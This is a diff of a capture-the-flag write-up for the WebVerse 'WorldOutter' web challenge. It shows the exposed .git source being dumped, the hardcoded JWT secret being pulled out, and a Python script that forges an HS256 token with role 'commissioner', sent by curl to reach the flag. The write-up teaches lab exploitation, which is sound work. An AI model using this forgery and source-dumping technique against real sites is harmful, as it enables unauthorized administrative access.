@@ -119,56 +119,97 @@ Phản hồi trả về trang quản trị chứa League API Key mang định d�
 
 > **Flag:** `WEBVERSE{cae45c5951bcb5565e70eb9ff37569a9}`
 
-This challenge belongs to the **Web** category from WebVerse / H7CTF'26. The target application manages global mission broadcasts.
 
-The vulnerabilities are exposed `.git` source disclosure and a weakly-signed JWT token secret.
+This article labeled **Web / WebVerse** revolves around exploiting the JWT authentication mechanism and exposing source code through `.git` files. The flag belongs to the WebVerse partner platform (`WEBVERSE{...}`) and the system automatically synchronizes the solution status according to the user's email account.
 
 ---
 
-## Solve Flow
+## Solve Flow Diagram
 
 ```mermaid
 flowchart TD
-    A["Target: WorldOutter Web Instance"] --> B["Inspect cookies: wo_session JWT (HS256)"]
-    B --> C["Access /.git/ directory: Exposed static source repository"]
-    C --> D["Dump repository via git-dumper: Extract server.js & package.json"]
-    D --> E["Inspect server.js: Discover hardcoded secret key 'wo_secret_2026'"]
-    E --> F["Forge admin JWT: Modify payload to {"role": "commissioner"}"]
-    F --> G["Send forged JWT to GET /commissioner"]
-    G --> H["Flag: WEBVERSE{cae45c5951bcb5565e70eb9ff37569a9}"]
+    A["Access the WorldOutter instance on WebVerse"] --> B["Cookie wo_session is JWT HS256: {user, team, role: 'member'}"]
+    B --> C["Access GET /commissioner -> 403 Forbidden do role != commissioner"]
+    A --> D["Detect server serve static directory: app.use('/.git', express.static(...))"]
+    D --> E["Read .git/logs/HEAD to get the original commit hash: 305afca"]
+    E --> F["Browse tree -> blob restore source code: config/secret.js"]
+    F --> G["Extract JWT_SECRET = '5923e2b9c0cb5ae74831b567b27ec6d0'"]
+    G --> H["Re-sign the JWT with payload role: 'commissioner'"]
+    H --> I["Reset the wo_session cookie and send GET /commissioner"]
+    I --> J["Successful access 200 OK -> League API key block"]
+    J --> K["Flag: WEBVERSE{cae45c5951bcb5565e70eb9ff37569a9}"]
 ```
 
 ---
 
-## Step 1: Git Repository Extraction & Secret Discovery
+## Step 1: Survey JWT Session Cookie
 
-The web server serves static files including `/.git`:
-```bash
-git-dumper http://target.webverse.org/.git/ ./dumped_git
+When accessing the web app, users receive the session cookie `wo_session`. Decode the JWT payload:
+
+```json
+{
+  "user": "you",
+  "team": "Gridiron Gophers",
+  "role": "member",
+  "iat": 1727334789
+}
 ```
-Reviewing `dumped_git/server.js`:
+
+When accessing the administrative endpoint `/commissioner`, the system blocks it with code `403 Forbidden` because it requires `role === 'commissioner'` permission.
+
+---
+
+## Step 2: Exploiting the `.git` Directory
+
+Checking common static paths, found that the Express.js server configuration exposed the entire `.git` directory:
+
 ```javascript
-const JWT_SECRET = "wo_secret_2026";
-app.get("/commissioner", (req, res) => {
-    if (req.user.role === "commissioner") {
-        return res.send(process.env.FLAG);
-    }
-});
+app.use('/.git', express.static(path.join(__dirname, '.git')));
+```
+
+Load the `.git/logs/HEAD` file to get the most recent commit ID, then follow the git objects (`commit` $\to$ `tree` $\to$ `blob`) to dump the entire source code.
+
+In the file `config/secret.js` we find the secret key:
+```javascript
+JWT_SECRET = '5923e2b9c0cb5ae74831b567b27ec6d0';
 ```
 
 ---
 
-## Step 2: JWT Forgery
+## Step 3: Forge JWT (Token Forgery) and Collect Flag
+
+Use the secret you just found to re-sign the token with `role: "commissioner"`:
 
 ```python
-import jwt
+import hmac, hashlib, base64, json, time
 
-payload = {"user": "admin", "team": "ptit", "role": "commissioner"}
-token = jwt.encode(payload, "wo_secret_2026", algorithm="HS256")
+secret = '5923e2b9c0cb5ae74831b567b27ec6d0'
 
-# Submit token in cookie wo_session to /commissioner
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')
+
+header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
+payload = b64url(json.dumps({
+    "user": "you",
+    "team": "Gridiron Gophers",
+    "role": "commissioner",
+    "iat": int(time.time())
+}).encode())
+
+signing_input = f"{header}.{payload}".encode()
+signature = b64url(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())
+
+forged_jwt = f"{header}.{payload}.{signature}"
+print("Forged Token:", forged_jwt)
 ```
 
-⇒ **Flag:** `WEBVERSE{cae45c5951bcb5565e70eb9ff37569a9}`
+Send request with new `wo_session` cookie to `/commissioner`:
 
+```bash
+curl -s -b "wo_session=$forged_jwt" https://<instance_id>.webverselabs-pro.com/commissioner
+```
+
+The response returned to the admin page containing the League API Key is in flag format:
+
+⇒ **Flag:** `WEBVERSE{cae45c5951bcb5565e70eb9ff37569a9}`
 </div>
